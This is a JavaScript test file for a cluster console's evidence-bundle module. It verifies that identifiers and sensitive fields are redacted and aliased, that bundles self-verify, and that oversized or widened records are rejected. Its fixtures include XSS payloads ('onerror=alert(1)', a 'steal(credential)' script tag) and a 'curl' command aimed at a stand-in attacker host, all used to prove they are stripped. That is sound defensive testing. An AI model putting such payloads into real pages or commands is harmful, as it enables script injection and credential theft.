'use strict';

const assert = require('node:assert/strict');
const { webcrypto } = require('node:crypto');
const test = require('node:test');

const {
  ClusterConsoleEvidenceBundleError,
  createClusterConsoleEvidenceBundle,
  limits,
  measureClusterConsoleEvidenceRecord,
  schema,
  serializeClusterConsoleEvidenceBundle,
  verifyClusterConsoleEvidenceBundle,
} = require('../assets/copilot-console/evidence-bundle.js');

const requestSchema = 'qinglong/cluster-copilot-console-read-request@v1';

function runRecord(overrides = {}) {
  return {
    operation: 'run_read',
    observedAtMs: 1_700_000_000_000,
    request: {
      schema: requestSchema,
      operation: 'run_read',
      projectId: 'project-customer-production',
      requestId: 'console-request-sensitive',
      runId: 'run-customer-production',
    },
    fact: {
      schema: 'qinglong/bounded-run-projection@v1',
      schemaVersion: 1,
      status: 'succeeded',
      projectId: 'project-customer-production',
      runId: 'run-customer-production',
      createdAtMs: 1_700_000_000_000,
      finalizedAtMs: 1_700_000_001_000,
      outputAvailable: true,
      name: 'customer-production-nightly',
      message: 'ql3c_console_do_not_export',
      path: '/private/customer/run.log',
      unknownField: '<img src=x onerror=alert(1)>',
    },
    ...overrides,
  };
}

function outputRecord() {
  return {
    operation: 'output',
    observedAtMs: 1_700_000_002_000,
    request: {
      schema: requestSchema,
      operation: 'output',
      projectId: 'project-customer-production',
      requestId: 'diagnosis-request-sensitive',
      sourceRunId: 'run-customer-production',
    },
    fact: {
      schema:
        'qinglong/cluster-copilot-failure-diagnosis-output-read-response@v1',
      schemaVersion: 1,
      status: 'available',
      projectId: 'project-customer-production',
      sourceRunId: 'run-customer-production',
      diagnosisRunId: 'diagnosis-run-sensitive',
      reference: {
        artifactId: 'artifact-sensitive',
        artifactDigest: 'a'.repeat(64),
        contentDigest: 'b'.repeat(64),
        outputBytes: 71,
        sealedAtMs: 1_700_000_001_000,
      },
      result: {
        text: '<script>steal(credential)</script>',
        command: 'curl https://attacker.invalid',
        token: 'ql3c_console_do_not_export',
        finishReason: 'stop',
      },
      usage: {
        inputTokens: 20,
        outputTokens: 10,
        totalTokens: 30,
        costMicros: 42,
      },
    },
  };
}

test('creates one self-verifiable redacted bundle with per-bundle correlated aliases', async () => {
  const records = [runRecord(), outputRecord()];
  assert.ok(measureClusterConsoleEvidenceRecord(records[0]) > 1);

  const bundle = await createClusterConsoleEvidenceBundle(
    records,
    1_700_000_003_000,
    webcrypto,
  );
  const encoded = serializeClusterConsoleEvidenceBundle(bundle);
  const parsed = JSON.parse(encoded);

  assert.equal(bundle.schema, schema);
  assert.equal(bundle.generatedBy, 'browser_local');
  assert.equal(bundle.actionAuthority, 'none');
  assert.equal(bundle.attestation, 'none');
  assert.equal(bundle.source.entryCount, 2);
  assert.equal(bundle.redaction.freeTextIncluded, false);
  assert.equal(bundle.redaction.copilotOutputIncluded, false);
  assert.equal(bundle.entries[0].target.projectId, 'project-001');
  assert.equal(bundle.entries[1].target.projectId, 'project-001');
  assert.equal(bundle.entries[0].target.runId, 'run-001');
  assert.equal(bundle.entries[1].target.sourceRunId, 'run-001');
  assert.equal(bundle.entries[0].fact.runId, 'run-001');
  assert.equal(bundle.entries[1].fact.sourceRunId, 'run-001');
  assert.equal(bundle.entries[1].fact.result, undefined);
  assert.equal(bundle.entries[1].fact.reference.artifactId, 'artifact-001');
  assert.match(bundle.entries[1].rawFact.sha256, /^[0-9a-f]{64}$/);
  assert.match(bundle.contentDigest, /^[0-9a-f]{64}$/);
  assert.equal(
    await verifyClusterConsoleEvidenceBundle(parsed, webcrypto),
    true,
  );

  for (const forbidden of [
    'project-customer-production',
    'run-customer-production',
    'diagnosis-run-sensitive',
    'artifact-sensitive',
    'customer-production-nightly',
    'ql3c_console_do_not_export',
    '/private/customer/run.log',
    '<img src=x onerror=alert(1)>',
    '<script>steal(credential)</script>',
    'attacker.invalid',
  ]) {
    assert.doesNotMatch(encoded, new RegExp(forbidden.replaceAll('/', '\\/')));
  }

  parsed.entries[0].fact.status = 'failed';
  assert.equal(
    await verifyClusterConsoleEvidenceBundle(parsed, webcrypto),
    false,
  );
});

test('resets the undisclosed alias table for every bundle', async () => {
  const first = await createClusterConsoleEvidenceBundle(
    [runRecord()],
    1_700_000_003_000,
    webcrypto,
  );
  const second = await createClusterConsoleEvidenceBundle(
    [
      runRecord({
        request: {
          schema: requestSchema,
          operation: 'run_read',
          projectId: 'another-project',
          requestId: 'another-request',
          runId: 'another-run',
        },
      }),
    ],
    1_700_000_004_000,
    webcrypto,
  );

  assert.equal(first.entries[0].target.runId, 'run-001');
  assert.equal(second.entries[0].target.runId, 'run-001');
  assert.notEqual(first.contentDigest, second.contentDigest);
  assert.equal(JSON.stringify(first).includes('another-run'), false);
  assert.equal(
    JSON.stringify(second).includes('run-customer-production'),
    false,
  );
});

test('redacts optional Run management observations while preserving fixed availability facts', async () => {
  const bundle = await createClusterConsoleEvidenceBundle(
    [
      {
        operation: 'run_cancellation_status',
        observedAtMs: 1_700_000_003_000,
        request: {
          schema: requestSchema,
          operation: 'run_cancellation_status',
          projectId: 'project-sensitive',
          requestId: 'console-request-sensitive',
        },
        fact: {
          schemaVersion: 1,
          schema: 'qinglong/run-cancellation-status@v1',
          component: 'qinglong3-run-management-client',
          event: 'cancellation_status_observed',
          requestId: 'console-request-sensitive',
          projectId: 'project-sensitive',
          observedAtMs: 1_700_000_003_000,
          assessment: 'attention_required',
          operatorAction: 'inspect',
          severity: 'critical',
          exitCode: 20,
          dispatches: {
            total: 1,
            pending: 0,
            leased: 0,
            retryWait: 0,
            dispatched: 0,
            blocked: 1,
          },
          signals: { due: 0, expiredLease: 0 },
          blockingResults: {
            identityMismatch: 1,
            pidMismatch: 0,
            unsupported: 0,
            invalid: 0,
          },
          oldestBlockedAtMs: 1_700_000_002_000,
        },
      },
    ],
    1_700_000_004_000,
    webcrypto,
  );
  const entry = bundle.entries[0];
  assert.equal(entry.operation, 'run_cancellation_status');
  assert.equal(entry.target.projectId, 'project-001');
  assert.equal(entry.fact.projectId, 'project-001');
  assert.equal(entry.fact.assessment, 'attention_required');
  assert.equal(entry.fact.operatorAction, 'inspect');
  assert.equal(entry.fact.dispatches.blocked, 1);
  assert.equal(entry.fact.blockingResults.identityMismatch, 1);
  assert.equal(entry.fact.component, undefined);
  assert.doesNotMatch(JSON.stringify(bundle), /project-sensitive/);
});

test('redacts Worker identity and preserves only bounded placement and capacity facts', async () => {
  const bundle = await createClusterConsoleEvidenceBundle(
    [
      {
        operation: 'worker_list',
        observedAtMs: 1_700_000_003_000,
        request: {
          schema: requestSchema,
          operation: 'worker_list',
          afterWorkerId: null,
          projectId: 'project-sensitive',
          requestId: 'worker-request-sensitive',
        },
        fact: {
          schema: 'qinglong/worker-session-list@v1',
          projectId: 'project-sensitive',
          observedAtMs: 1_700_000_003_000,
          count: 1,
          workers: [
            {
              workerId: 'worker-sensitive',
              sessionId: 'session-must-not-export',
              generation: 2,
              sessionVersion: 5,
              lifecycle: 'online',
              compatibility: 'default_placement',
              architecture: 'arm64',
              supportTier: 'tier1',
              protocolVersion: '1.0.0',
              operatingSystem: 'linux',
              maxConcurrentRuns: 2,
              availableSlots: 1,
              lastHeartbeatAtMs: 1_700_000_002_000,
              leaseExpiresAtMs: 1_700_000_004_000,
            },
          ],
          nextAfterWorkerId: 'worker-sensitive',
        },
      },
    ],
    1_700_000_004_000,
    webcrypto,
  );
  const entry = bundle.entries[0];
  assert.equal(entry.operation, 'worker_list');
  assert.equal(entry.target.afterWorkerId, null);
  assert.equal(entry.fact.workers[0].workerId, 'worker-001');
  assert.equal(entry.fact.nextAfterWorkerId, 'worker-001');
  assert.equal(entry.fact.workers[0].lifecycle, 'online');
  assert.equal(entry.fact.workers[0].compatibility, 'default_placement');
  assert.equal(entry.fact.workers[0].architecture, 'arm64');
  assert.equal(entry.fact.workers[0].supportTier, 'tier1');
  assert.equal(entry.fact.workers[0].availableSlots, 1);
  assert.equal(entry.fact.workers[0].sessionId, undefined);
  assert.equal(entry.fact.workers[0].protocolVersion, undefined);
  assert.doesNotMatch(
    JSON.stringify(bundle),
    /worker-sensitive|session-must-not-export|project-sensitive/,
  );
});

test('redacts Package transport identity and keeps bounded installation state', async () => {
  const bundle = await createClusterConsoleEvidenceBundle(
    [
      {
        operation: 'package_list',
        observedAtMs: 1_700_000_005_000,
        request: {
          schema: requestSchema,
          operation: 'package_list',
          afterPackageName: null,
          projectId: 'project-sensitive',
          requestId: 'package-request-sensitive',
        },
        fact: {
          schema: 'qinglong/plugin-package-installation-list@v1',
          projectId: 'project-sensitive',
          count: 1,
          installations: [
            {
              packageName: 'ops-package-sensitive',
              packageVersion: '3.1.0',
              installOperation: 'upgrade',
              state: 'active',
              targetGeneration: 4,
              recoveryAction: 'none',
              availability: 'active',
              quarantineReason: null,
              failureReason: null,
              version: 7,
              createdAtMs: 1_700_000_001_000,
              updatedAtMs: 1_700_000_004_000,
              installationId: 'must-not-export',
              recordDigest: 'a'.repeat(64),
            },
          ],
          truncated: true,
          nextAfterPackageName: 'ops-package-sensitive',
        },
      },
    ],
    1_700_000_006_000,
    webcrypto,
  );
  const entry = bundle.entries[0];
  assert.equal(entry.operation, 'package_list');
  assert.equal(entry.fact.installations[0].packageName, 'package-001');
  assert.equal(entry.fact.nextAfterPackageName, 'package-001');
  assert.equal(entry.fact.installations[0].installOperation, 'upgrade');
  assert.equal(entry.fact.installations[0].state, 'active');
  assert.equal(entry.fact.installations[0].targetGeneration, 4);
  assert.equal(entry.fact.installations[0].installationId, undefined);
  assert.equal(entry.fact.installations[0].recordDigest, 'digest-001');
  assert.equal(entry.fact.installations[0].packageVersion, undefined);
  assert.doesNotMatch(
    JSON.stringify(bundle),
    /ops-package-sensitive|package-request-sensitive|project-sensitive|must-not-export/,
  );
});

test('fails closed on widened records, unsafe JSON and every capacity ceiling', async () => {
  const error = { code: 'QL3_CLUSTER_CONSOLE_EVIDENCE_BUNDLE_INVALID' };
  assert.throws(() => measureClusterConsoleEvidenceRecord(null), error);
  assert.throws(
    () => measureClusterConsoleEvidenceRecord({ ...runRecord(), session: 'x' }),
    error,
  );
  assert.throws(
    () =>
      measureClusterConsoleEvidenceRecord({
        ...runRecord(),
        operation: 'cancel',
      }),
    error,
  );
  assert.throws(
    () =>
      measureClusterConsoleEvidenceRecord({
        ...runRecord(),
        request: { ...runRecord().request, endpoint: 'https://example.test' },
      }),
    error,
  );
  assert.throws(
    () =>
      measureClusterConsoleEvidenceRecord({
        ...runRecord(),
        fact: { items: Array.from({ length: 65 }, () => ({})) },
      }),
    error,
  );
  const cyclic = runRecord();
  cyclic.fact.loop = cyclic.fact;
  assert.throws(() => measureClusterConsoleEvidenceRecord(cyclic), error);
  assert.throws(
    () =>
      measureClusterConsoleEvidenceRecord({
        ...runRecord(),
        fact: { message: 'x'.repeat(limits.maximumEntryFactBytes + 1) },
      }),
    error,
  );

  await assert.rejects(
    createClusterConsoleEvidenceBundle([], 1_700_000_003_000, webcrypto),
    ClusterConsoleEvidenceBundleError,
  );
  await assert.rejects(
    createClusterConsoleEvidenceBundle(
      Array.from({ length: limits.maximumRecords + 1 }, () => runRecord()),
      1_700_000_003_000,
      webcrypto,
    ),
    ClusterConsoleEvidenceBundleError,
  );
  const largeRecords = Array.from({ length: 5 }, (_, index) =>
    runRecord({
      observedAtMs: 1_700_000_000_000 + index,
      fact: { message: String(index) + 'x'.repeat(2 * 1024 * 1024 - 64) },
    }),
  );
  await assert.rejects(
    createClusterConsoleEvidenceBundle(
      largeRecords,
      1_700_000_003_000,
      webcrypto,
    ),
    ClusterConsoleEvidenceBundleError,
  );
  assert.throws(
    () =>
      serializeClusterConsoleEvidenceBundle({
        schema,
        contentDigest: 'a'.repeat(64),
        padding: 'x'.repeat(limits.maximumBundleBytes),
      }),
    error,
  );
});
